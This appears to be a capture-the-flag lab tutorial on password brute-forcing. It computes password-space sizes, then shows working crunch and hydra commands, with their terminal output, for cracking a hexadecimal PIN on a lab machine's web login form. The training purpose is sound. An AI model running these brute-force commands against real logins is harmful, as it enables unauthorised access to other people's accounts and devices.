	Topic: Brute-forcing
	Name: Hydra is coming to town

### Counting the Passwords

Let’s consider an imaginary scenario where the password is exactly four characters, and each character can be:

- A digit: We have 10 digits (0 to 9)
- An uppercase English letter: We have 26 letters (A to Z)
- A lowercase English letter: We have 26 letters (a to z)

Therefore, each character can be one of 62 different choices. Consequently, if the password is four characters, we can make 62×62×62×62 = 624 = 14,776,336 different passwords.

To make the password even more complex, we can use symbols, adding more than 30 characters to our set of choices.

![Table showing the number of possible passwords when using 4, 6, 8, 10, 12, 14, and 16 characters. The characters are limited to uppercase, lowercase, and digits.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/feccfe2c7f1243aba09b07381c1c5261.svg)

### How Long Does It Take To Brute Force the Password

14 million is a huge number, but we can use a computer system to try out all the possible password combinations, i.e., brute force the password. If trying a password takes 0.001 seconds due to system throttling (i.e., we can only try 1,000 passwords per second), finding the password will only take up to four hours.

If you are curious about the maths, 624×0.001 = 14, 776 _seconds_ is the number of seconds necessary to try out all the passwords. We can find the number of hours needed to try out all the passwords by dividing by 3,600 (1 hour = 3,600 seconds): 14,776/3,600 = 4.1 _hours_.

In reality, the password can be closer to the beginning of the list or closer to the end. Therefore, on average, we can expect to find the password in around two hours, i.e., 4.1/2 = 2.05 _hours_. Hence, a four-character password is generally considered insecure.

We should note that in this hypothetical example, we are assuming that we can try 1,000 passwords every second. Few systems would let us go this fast. After a few incorrect attempts, most would lock us out or impose frustratingly long waiting periods. On the other hand, with the password hash, we can try passwords offline. In this case, we would only be limited by how fast our computer is.

We can make passwords more secure by increasing the password complexity. This can be achieved by specifying a minimum password length and character variety. For example, the character variety might require at least one uppercase letter, one lowercase letter, one digit, and one symbol.

![Hacker using a hand-held computer to  attack a door PIN code reader](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c8bf82accc227de107ecf5a79da1f992.svg)

### Generating the Password List

The numeric keypad shows 16 characters, 0 to 9 and A to F, i.e., the hexadecimal digits. We need to prepare a list of all the PIN codes that match this criteria. We will use Crunch, a tool that generates a list of all possible password combinations based on given criteria. We need to issue the following command:

`crunch 3 3 0123456789ABCDEF -o 3digits.txt`

The command above specifies the following:

- `3` the first number is the minimum length of the generated password
- `3` the second number is the maximum length of the generated password
- `0123456789ABCDEF` is the character set to use to generate the passwords
- `-o 3digits.txt` saves the output to the `3digits.txt` file

To prepare our list, run the above command on the AttackBox’s terminal.

AttackBox Terminal:
```shell-session
root@AttackBox# crunch 3 3 0123456789ABCDEF -o 3digits.txt
Crunch will now generate the following amount of data: 16384 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 4096
crunch: 100% completed generating output
```

After executing the command above, we will have `3digits.txt` ready to brute force the website.

### Using the Password List

Manually trying out PIN codes is a very daunting task. Luckily, we can use an automated tool to try our generated digit combinations. One of the most solid tools for trying passwords is Hydra.

Before we start, we need to view the page’s HTML code. We can do that by right-clicking on the page and selecting “View Page Source”. You will notice that:

1. The method is `post`
2. The URL is `http://10.10.103.85:8000/login.php`
3. The PIN code value is sent with the name `pin`

![The HTML code related to the PIN code form.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c55803e3eccf061b8beeae6268b9dae1.png)  

In other words, the main login page http://10.10.103.85:8000/pin.php receives the input from the user and sends it to `/login.php` using the name `pin`.

These three pieces of information, `post`, `/login.php`, and `pin`, are necessary to set the arguments for Hydra.

We will use `hydra` to test every possible password that can be put into the system. The command to brute force the above form is:

`hydra -l '' -P 3digits.txt -f -v 10.10.103.85 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`

The command above will try one password after another in the `3digits.txt` file. It specifies the following:

- `-l ''` indicates that the login name is blank as the security lock only requires a password
- `-P 3digits.txt` specifies the password file to use
- `-f` stops Hydra after finding a working password
- `-v` provides verbose output and is helpful for catching errors
- `10.10.103.85` is the IP address of the target
- `http-post-form` specifies the HTTP method to use
- `"/login.php:pin=^PASS^:Access denied"` has three parts separated by `:`
    - `/login.php` is the page where the PIN code is submitted
    - `pin=^PASS^` will replace `^PASS^` with values from the password list
    - `Access denied` indicates that invalid passwords will lead to a page that contains the text “Access denied”
- `-s 8000` indicates the port number on the target

It’s time to run `hydra` and discover the password. Please note that in this case, we expect `hydra` to take three minutes to find the password. Below is an example of running the command above:

AttackBox Terminal:
```shell-session
root@AttackBox# hydra -l '' -P 3digits.txt -f -v 10.10.103.85 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-19 17:38:42
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1109 login tries (l:1/p:1109), ~70 tries per task
[DATA] attacking http-post-form://10.10.103.85:8000/login.php:pin=^PASS^:Access denied
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http[s]://MACHINE_IP:8000/error.php
[VERBOSE] Page redirected to http[s]://MACHINE_IP:8000/error.php
[VERBOSE] Page redirected to http[s]://MACHINE_IP:8000/error.php
[...]
[VERBOSE] Page redirected to http[s]://MACHINE_IP:8000/error.php
[8000][http-post-form] host: MACHINE_IP   password: [redacted]
[STATUS] attack finished for MACHINE_IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-19 17:39:24
```

The command above shows that `hydra` has successfully found a working password. On the AttackBox, running the above command should finish within three minutes.